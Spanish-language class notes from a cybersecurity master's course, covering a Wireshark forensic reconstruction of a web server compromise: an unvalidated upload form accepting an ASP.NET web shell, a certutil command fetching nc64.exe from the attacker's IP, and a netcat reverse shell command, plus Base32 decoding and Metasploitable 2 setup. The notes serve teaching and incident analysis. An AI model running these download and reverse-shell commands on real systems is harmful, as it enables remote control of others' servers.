> [!info] Ficha técnica
> **Máster de Ciberseguridad e Inteligencia Artificial** · **Clase 17**
> **Módulo:** MODULO3
> **Tema:** Clase 17
> **Fuente:** Apuntes Joselu · Evolve Academy

> [!tip] Cómo leer estos apuntes
> Resumen estructurado de la clase 17. Contenido optimizado para estudio activo y repaso rápido antes de exámenes.

---

```

openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -subj "/CN=localhost"

# Levantar servidor en HTTP o HTTPS

python3 server.py http python3 server.py https

# Filtro en Wireshark para ver solo el puerto

tcp.port == 8443 tcp.port == 80

Una nota importante sobre adaptadores: si Wireshark no captura tráfico en eth0, lanzarlo con la interfaz any (sudo wireshark -i any) escucha en todos los adaptadores simultáneamente.

Esto resuelve la mayoría de los problemas de configuración con VirtualBox en modo NAT.

> [!important] - **La idea clave:** un candadito verde en el navegador no es estética, es la diferencia entre que cualquiera en tu red local pueda ver tus credenciales o no.

Las impresoras corporativas sin certificado y con credenciales por defecto son una vía de entrada real que aparece en auditorías todo el tiempo

**Metodología de análisis forense sobre un PCAP**

El escenario del ejercicio: un servidor web ha activado una alerta de antivirus, ningún administrador reconoce haberlo tocado, y se dispone de una captura de red tomada antes de apagar el sistema.

El objetivo es reconstruir qué ocurrió.

Los primeros pasos antes de mirar un solo paquete son siempre los mismos, como vimos en la clase de CyberDefenders:

Estadísticas → Protocol Hierarchy revela que el protocolo dominante es HTTP sobre TCP.

Eso significa tráfico web sin cifrar, analizable en texto claro, y nos orienta directamente hacia la capa 7.

Con un filtro http aplicado, los primeros paquetes muestran navegación normal: un cliente con IP .7 hace GETs al servidor .5.

Ya tenemos los dos actores identificados.

El .5 escucha en el puerto 80 y sirve contenido: es el servidor web.

El .7 hace peticiones: es el cliente, y en este contexto, el potencial atacante.

**File upload y subida de Web Shell**

Entre los paquetes HTTP aparece una petición GET a /upload.aspx.

La extensión .aspx ya dice algo: el servidor corre sobre tecnología [ASP.NET](http://asp.net/) de Microsoft, por tanto es Windows.

Siguiendo el TCP stream de esa petición se ve que upload.aspx es un formulario que permite subir archivos al servidor sin ningún tipo de autenticación.

Poco después aparece un POST a ese mismo endpoint.

El stream revela que el archivo subido se llama cmd.aspx y contiene código [ASP.NET](http://asp.net/) con una función llamada RunCmd.

Esa función lo que hace es recibir un parámetro, ejecutarlo como comando del sistema operativo, y devolver el resultado.

Eso es una **web shell**: un archivo malicioso subido al servidor que convierte cualquier petición web en ejecución remota de comandos.

Quien conozca la ruta tiene una consola del servidor abierta en el navegador.

La razón por la que el servidor lo aceptó: no tiene restricciones de extensión en el componente de subida.

Un servidor bien configurado debería bloquear extensiones ejecutables (.aspx, .php, .jsp) y permitir solo imágenes y documentos.

- **La metáfora útil:** un formulario de subida de archivos sin validar extensiones es como una recepción de empresa que acepta cualquier paquete sin mirar el remitente ni el contenido.

Si alguien deja ahí un ordenador encendido que ejecuta comandos, nadie lo va a detectar hasta que ya es tarde

**LOLBins: usar las herramientas del sistema contra sí mismo**

Una vez que el atacante tiene su web shell funcionando, el siguiente paso en el stream es un POST con un comando ejecutado a través de ella:

certutil -urlcache -split -f http://22.22.22.7/nc64.exe C:\Users\Public\nc64.exe

certutil es una herramienta nativa de Windows diseñada para gestionar certificados.

Sin embargo, tiene una funcionalidad secundaria: puede descargar archivos desde URLs.

El atacante la está usando para descargarse nc64.exe (Netcat) desde su propia IP al servidor víctima.

Esto es un **LOLBIN** (Living Off the Land Binary): un binario legítimo de Windows, firmado por Microsoft, que los atacantes utilizan para fines maliciosos.

Como el sistema operativo confía en él, ni el antivirus ni el Defender van a bloquearlo.

- El atacante no instala nada sospechoso.

Usa lo que ya hay
- certutil está firmado, por tanto pasa todos los filtros de ejecución
- La única defensa posible es monitorizar el comportamiento: si certutil hace una llamada de red a una IP externa, eso es anómalo y debería disparar una alerta

Otros LOLBins conocidos que aparecerán en el módulo de Active Directory: mshta, regsvr32, wmic, bitsadmin.

La lista completa se puede consultar en [lolbas-project.github.io](http://lolbas-project.github.io/).

**Bind Shell vs Reverse Shell**

Con Netcat en el servidor, el atacante ejecuta el siguiente comando a través de la web shell:

nc64.exe 22.22.22.7 4444 -e cmd.exe

Esto establece una **reverse shell**: el servidor víctima se conecta al atacante (IP .7) en el puerto 4444, y cuando la conexión se establece, le entrega una consola CMD.

La distinción crítica con una bind shell es la dirección de la conexión:

- **Bind shell:** la víctima escucha en un puerto y el atacante se conecta a ella.

Los firewalls suelen bloquear conexiones entrantes no autorizadas, así que esto falla a menudo
- **Reverse shell:** la víctima inicia la conexión hacia el atacante.

Las conexiones salientes rara vez están bloqueadas, por lo que pasan desapercibidas

Filtrando en Wireshark por tcp.port == 4444 y siguiendo el TCP stream, se ve en texto claro toda la conversación entre el atacante y el servidor: los comandos ejecutados (whoami, ipconfig, cd) y las respuestas del sistema en rojo.

Wireshark → tcp.port == 4444 → clic derecho → Follow → TCP Stream

El atacante ejecuta whoami primero, siempre, para saber con qué usuario y permisos ha entrado.

Si el resultado fuera NT AUTHORITY\\SYSTEM, tendría control total.

En este caso es un usuario de menor privilegio, lo que indica que el compromiso está en curso pero la escalada de privilegios aún no se ha producido.

**Codificación vs Criptografía, y CyberChef**

En el stream de la reverse shell, el atacante intenta descargar un fichero cuyo nombre parece estar codificado: solo letras mayúsculas y números del 2 al 7.

La herramienta para descifrar esto es **CyberChef** (gchq.github.io/CyberChef).

CyberChef tiene una función llamada **Magic** que prueba automáticamente distintos esquemas de codificación hasta encontrar uno que produzca un resultado legible.

En este caso era Base32.

La diferencia conceptual que conviene tener clara:

- **Codificación:** transforma datos de una representación a otra usando un algoritmo conocido, sin clave secreta.

El objetivo es compatibilidad, no seguridad.

Base64, Base32, hexadecimal son codificaciones, no cifrados
- **Criptografía:** transforma datos usando una clave secreta.

Sin la clave, los datos son ilegibles.

TLS, AES son criptografía

Un == al final de una cadena de caracteres suele indicar Base64.

Si los caracteres son solo mayúsculas y números del 2 al 7, suele ser Base32.

**Instalación de Metasploitable 2**

Al final de la sesión se introduce **Metasploitable 2**, una máquina virtual Linux diseñada específicamente para ser vulnerable, que se usará en las próximas semanas como primer entorno de práctica de enumeración y explotación real.

Credenciales por defecto: msfadmin / msfadmin

La instalación en VirtualBox consiste en descargar el VMDK, crear una nueva máquina virtual con nombre Metasploitable2, y en la pantalla de disco duro seleccionar \"Usar un archivo de disco virtual existente\" para cargar el VMDK descargado.

No hace falta instalar nada.

Metasploitable 2 tiene servicios vulnerables en múltiples puertos, lo que permite practicar el ciclo completo: escaneo con Nmap, identificación de servicios, búsqueda de vulnerabilidades y explotación.

Es el paso previo natural a HackTheBox.

**Recapitulación integrada**

Al cerrar esta sesión somos capaces de leer un PCAP de un incidente real y reconstruir un ataque completo de principio a fin.

Sabemos que un formulario de subida sin validación de extensiones es una puerta de entrada directa para una web shell.

Sabemos que los atacantes no siempre traen sus propias herramientas: a menudo usan lo que ya está en el sistema (LOLBins como certutil) precisamente para no levantar alertas.

Sabemos diferenciar entre bind shell y reverse shell, y entendemos por qué la segunda es la técnica preferida: los firewalls rara vez bloquean tráfico saliente.

Y tenemos ya instalado Metasploitable 2, que será el campo de entrenamiento de las próximas sesiones cuando arranque en serio la fase ofensiva del máster.


---

## 🔗 Red de Conocimiento

### Documentos Relacionados

- [[../../apuntes Andres/01.09.2026 Repaso General I.md|01.09.2026 Repaso General I]] — File Upload, Metasploit, Netcat / Reverse Shells
- [[../../apuntes evolve/BLOQUE 2.md|BLOQUE 2]] — Metasploit, Metasploitable / DVWA, Netcat / Reverse Shells
- [[../../transcripciones/Junio/16.06.2026 Mr. Robot Explotación Web Completa File Upload, Reverse Shell y SUID Hijacking.md|16.06.2026 Mr. Robot Explotación Web Completa File Upload, Reverse Shell y SUID Hijacking]] — File Upload, Metasploit, Metasploitable / DVWA
- [[resumen_master_clase26.md|resumen_master_clase26]] — File Upload, Metasploitable / DVWA, Netcat / Reverse Shells
- [[../../apuntes Chema/Sesion_25_Repaso_MercadoLaboral_Servicios.md|Sesion_25_Repaso_MercadoLaboral_Servicios]] — Metasploit, Metasploitable / DVWA, Netcat / Reverse Shells
- [[../MODULO1/resumen_master_clase3.md|resumen_master_clase3]] — Metasploitable / DVWA, Netcat / Reverse Shells, Reverse Shells

### 🛠️ Herramientas

- [[comandos/Metasploit|Metasploit]]
- [[comandos/Metasploit|Netcat / Reverse Shells]]
- [[comandos/Nmap|Nmap]]

### 🎯 Vulnerabilidades Relacionadas


> #escalada-privilegios #file-upload #forense #hack-the-box #ia #linux #metasploit #metasploitable #netcat #nmap #pentest #redes #reverse-shell #windows #wireshark
